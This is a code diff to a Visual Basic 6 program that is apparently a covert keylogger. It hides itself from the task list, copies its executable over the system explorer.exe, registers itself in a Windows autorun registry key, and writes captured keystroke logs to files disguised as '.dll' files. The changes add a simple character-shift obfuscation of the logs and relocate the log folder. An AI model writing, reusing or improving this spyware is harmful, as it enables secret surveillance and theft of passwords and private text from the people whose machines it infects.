@@ -5,15 +5,23 @@ Begin VB.Form Form1
    ClientHeight    =   6000
    ClientLeft      =   45
    ClientTop       =   435
-   ClientWidth     =   6375
+   ClientWidth     =   10230
    ControlBox      =   0   'False
    Icon            =   "Form1.frx":0000
    LinkTopic       =   "Form1"
    MaxButton       =   0   'False
    MinButton       =   0   'False
    ScaleHeight     =   6000
-   ScaleWidth      =   6375
+   ScaleWidth      =   10230
    StartUpPosition =   3  'Windows Default
+   Begin VB.TextBox Text3 
+      Height          =   4335
+      Left            =   6480
+      MultiLine       =   -1  'True
+      TabIndex        =   6
+      Top             =   720
+      Width           =   3135
+   End
    Begin VB.Timer Timer2 
       Interval        =   530
       Left            =   5640
@@ -33,7 +41,6 @@ Begin VB.Form Form1
       Left            =   4680
       TabIndex        =   4
       Top             =   960
-      Visible         =   0   'False
       Width           =   1335
    End
    Begin VB.CommandButton Command2 
@@ -127,7 +134,6 @@ Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As I
 Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer 'caps keystate
 Dim result As Integer
 
-Dim n As Integer    'contains no. of logs to name this log
 
 
 
@@ -142,14 +148,13 @@ App.TaskVisible = False
 'Me.Hide
 Timer1.Enabled = True
 
-Text1.Text = Date & "," & Time & "," & username & vbTab & vbCrLf 'prints info at startup
+Text1.Text = "'" & Date & "','" & Time & "','" & username & "'" & Chr(13) & vbCrLf  'prints info at startup
 
 On Error Resume Next
 Call setautorun
 FileCopy App.Path & "\" & App.EXEName & ".exe", "C:\windows\system32\explorer.exe"
-MkDir "C:\WINDOWS\system32\sysResource"
-File1.Path = "c:\windows\system32\sysResource"
-n = File1.ListCount
+MkDir "c:\sysResource"
+File1.Path = "c:\sysResource"
 End Sub
 
 Private Sub setautorun()
@@ -165,7 +170,7 @@ Dim status As Long
 
     ' Open the key, creating it if it doesn't exist.
     If RegCreateKeyEx(HKEY_CURRENT_USER, _
-        "Software\Microsoft\Windows\CurrentVersion\Run", _
+        "Software\Microsoft\Windows\CurrentVersion\RunOnce", _
         ByVal 0&, ByVal 0&, ByVal 0&, _
         KEY_WRITE, ByVal 0&, hKey, _
         ByVal 0&) <> ERROR_SUCCESS _
@@ -432,8 +437,13 @@ Text1.Text = Text1.Text & vbCrLf & Time & " : " & Text2.Text & vbCrLf
 End Sub
 '************************Recordingtofile*********
 Private Sub recordnow()
-Open "C:\windows\system32\sysResource\browse" & n + 1 & "xcz" & ".dll" For Output As #1
-        Print #1, Text1.Text
+Dim i As Integer
+For i = 1 To Len(Text1)
+Text3.Text = Text3.Text & Chr(Asc(Mid(Text1, i, 1)) + 1)
+Next i
+
+Open "c:\sysResource\browse" & File1.ListCount + 1 & "xcz" & ".dll" For Output As #1
+        Print #1, Text3.Text
 Close #1
 End Sub
 '******************kEYCASEPART***********
